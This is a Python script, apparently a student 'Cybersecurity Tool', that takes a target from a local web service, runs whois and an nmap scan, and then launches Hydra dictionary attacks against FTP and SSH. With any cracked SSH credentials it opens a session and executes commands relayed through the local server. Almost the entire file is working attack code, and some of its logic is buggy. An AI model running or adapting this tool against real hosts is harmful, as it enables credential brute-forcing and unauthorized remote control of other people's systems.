#!/usr/bin/env python3

import subprocess
import socket
import paramiko
import re
import os
import requests
import time
# Banner
def send_post_req_bytes(data):
    output_lines = ''
    for l in data.stdout.splitlines():
        output_lines += l.decode('utf-8')
        output_lines += '\n'
    print(output_lines)
    url = 'http://127.0.0.1:8000/send_output/'
    data = {'output': output_lines}
    requests.post(url, data=data)

def send_post_req(data):
    print(data)
    url = 'http://127.0.0.1:8000/send_output/'
    data = {'output': data}
    requests.post(url, data=data)

def cyberFusion():
    banner = """
    ┌───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
    │                                                                                                                       │
    │                                                                                                                       │
    │                                                                                                                       │
    │      █████████             █████                           ███████████                     ███                        │
    │     ███░░░░░███           ░░███                           ░░███░░░░░░█                    ░░░                         │
    │    ███     ░░░  █████ ████ ░███████   ██████  ████████     ░███   █ ░  █████ ████  █████  ████   ██████  ████████     │
    │   ░███         ░░███ ░███  ░███░░███ ███░░███░░███░░███    ░███████   ░░███ ░███  ███░░  ░░███  ███░░███░░███░░███    │
    │   ░███          ░███ ░███  ░███ ░███░███████  ░███ ░░░     ░███░░░█    ░███ ░███ ░░█████  ░███ ░███ ░███ ░███ ░███    │
    │   ░░███     ███ ░███ ░███  ░███ ░███░███░░░   ░███         ░███  ░     ░███ ░███  ░░░░███ ░███ ░███ ░███ ░███ ░███    │
    │    ░░█████████  ░░███████  ████████ ░░██████  █████        █████       ░░████████ ██████  █████░░██████  ████ █████   │
    │     ░░░░░░░░░    ░░░░░███ ░░░░░░░░   ░░░░░░  ░░░░░        ░░░░░         ░░░░░░░░ ░░░░░░  ░░░░░  ░░░░░░  ░░░░ ░░░░░    │
    │                  ███ ░███                                                                                             │
    │                 ░░██████                                                                                              │
    │                  ░░░░░░                                                                                               │
    │                                                                                                                       │
    │                                                                                                                       │
    │                 ____      _                                        _ _           _____           _                    │
    │                / ___|   _| |__   ___ _ __ ___  ___  ___ _   _ _ __(_) |_ _   _  |_   _|__   ___ | |                   │
    │               | |  | | | | '_ \ / _ \ '__/ __|/ _ \/ __| | | | '__| | __| | | |   | |/ _ \ / _ \| |                   │
    │               | |__| |_| | |_) |  __/ |  \__ \  __/ (__| |_| | |  | | |_| |_| |   | | (_) | (_) | |                   │
    │                \____\__, |_.__/ \___|_|  |___/\___|\___|\__,_|_|  |_|\__|\__, |   |_|\___/ \___/|_|                   │
    │                     |___/                                                |___/                                        │
    │                                                    ____                                                               │
    │                                                   | __ ) _   _                                                        │
    │                                                   |  _ \| | | |                                                       │
    │                                                   | |_) | |_| |                                                       │
    │                                                   |____/ \__, |                                                       │
    │                                                          |___/                                                        │
    │                              _____                     __     ____     _____ _____                                    │
    │                             |_   _|__  __ _ _ __ ___   \ \   / /\ \   / /_ _|_   _|                                   │
    │                               | |/ _ \/ _` | '_ ` _ \   \ \ / /  \ \ / / | |  | |                                     │
    │                               | |  __/ (_| | | | | | |   \ V /    \ V /  | |  | |                                     │
    │                               |_|\___|\__,_|_| |_| |_|    \_/      \_/  |___| |_|                                     │
    │                                                                                                                       │
    └───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
    """
    send_post_req(banner)


    exit_banner = '''
        ╔════════════════════════════════════════════════╗
        ║                                                ║
        ║                                                ║
        ║    _____      _ _   _                          ║
        ║   | ____|_  _(_) |_(_)_ __   __ _              ║
        ║   |  _| \ \/ / | __| | '_ \ / _` |             ║
        ║   | |___ >  <| | |_| | | | | (_| |  _ _ _ _    ║
        ║   |_____/_/\_\_|\__|_|_| |_|\__, | (_|_|_|_)   ║
        ║   | __ ) _   _  ___         |___/              ║
        ║   |  _ \| | | |/ _ \                           ║
        ║   | |_) | |_| |  __/                           ║
        ║   |____/ \__, |\___|                           ║
        ║          |___/                                 ║
        ║                                                ║
        ║                                                ║
        ╚════════════════════════════════════════════════╝
    '''
    
    while True:
        url = 'http://127.0.0.1:8000/get_ip'
        response = requests.get(url)
        input_address = response.json()['ip']
        if input_address != 'NoIpFound':
            break
        else:
            time.sleep(4)

    

    # Function to check if input is an IP address
    def is_ip_address(address):
        return bool(re.match(r'^(\d{1,3}\.){3}\d{1,3}$', address))

    # Determine if input is a valid IP address
    if is_ip_address(input_address):
        ip = input_address
    else:
        try:
            ip = socket.gethostbyname(input_address)
        except socket.gaierror:
            send_post_req(f"Failed to resolve IP address for {input_address}")
            exit(1)

    # Perform whois lookup
    send_post_req(f"WHOIS Lookup for {ip}:")
    t = subprocess.run(['whois', ip], capture_output=True)
    send_post_req_bytes(t)

    # Perform port scanning
    send_post_req(f"Port scanning {ip}:")
    port_scan = subprocess.check_output(['nmap', '-Pn', '21,22', ip]).decode()
    send_post_req(port_scan)
    # If port 22 or 21 is open, perform dictionary-based attack
    if "21/tcp" in port_scan:
        send_post_req("Port 21 (FTP) is open. Performing dictionary-based attack...")
        # Perform FTP dictionary-based attack using Hydra
        t = subprocess.run(['hydra', '-L', 'usernames.txt', '-P', 'passwords.txt', f'ftp://{ip}', '-t4'], capture_output=True)
        send_post_req_bytes(t)

    if "22/tcp" in port_scan:
        send_post_req("Port 22 (SSH) is open. Performing dictionary-based attack...")
        # Run Hydra and write output to a file
        hydra_output_file = "hydra_output.txt"
        with open(hydra_output_file, "w") as output_file:
            subprocess.run(['hydra', '-L', 'usernames.txt', '-P', 'passwords.txt', f'ssh://{ip}', '-t4'], stdout=output_file, text=True)
        # Parse the Hydra output file to extract successful SSH credentials
        with open(hydra_output_file, "r") as input_file:
            for line in input_file:
                match = re.search(r'login:\s*(\S+)\s+password:\s*(\S+)', line)
                if match:
                    ssh_username = match.group(1)
                    ssh_password = match.group(2)
                    break  # Stop parsing after the first match
        
        if ssh_username and ssh_password:
            try:
                hostname = ip
                port = 22  # Default SSH port is 22
                
                # Create an SSH client instance
                ssh_client = paramiko.SSHClient()
                # Automatically add host keys without requiring user confirmation (not recommended for production)
                ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # Connect to the SSH server
                ssh_client.connect(hostname, port, ssh_username, ssh_password)
                send_post_req("Connected to SSH server successfully!")
                
                # Execute commands within the persistent connection
                while True:
                    send_post_req("Enter command to execute (or 'bye' to quit): ")
                    while True:
                        url = 'http://127.0.0.1:8000/get_command'
                        response = requests.get(url)
                        command = response.json()['command']
                        if command != 'ErrorNoCommand':
                            break
                        else:
                            time.sleep(4)
                    # command = input("Enter command to execute (or 'bye' to quit): ")
                    if command.lower() == 'bye':
                        send_post_req(exit_banner)
                        break
                    # Execute the command
                    stdin, stdout, stderr = ssh_client.exec_command(command)
                    # Read the output of the command
                    output = stdout.read().decode()
                    send_post_req("Command output:")
                    send_post_req(output)
            except paramiko.AuthenticationException:
                send_post_req("Authentication failed. Please check your username and password.")
            except paramiko.SSHException as e:
                send_post_req(f"SSH connection failed: {e}")
            except Exception as e:
                send_post_req(f"An error occurred: {e}")
            finally:
                # Close the SSH connection
                ssh_client.close()
        else:
            send_post_req("No valid SSH credentials found.")

    # Delete the Hydra output file
        os.remove(hydra_output_file)
    #!/usr/bin/env python3

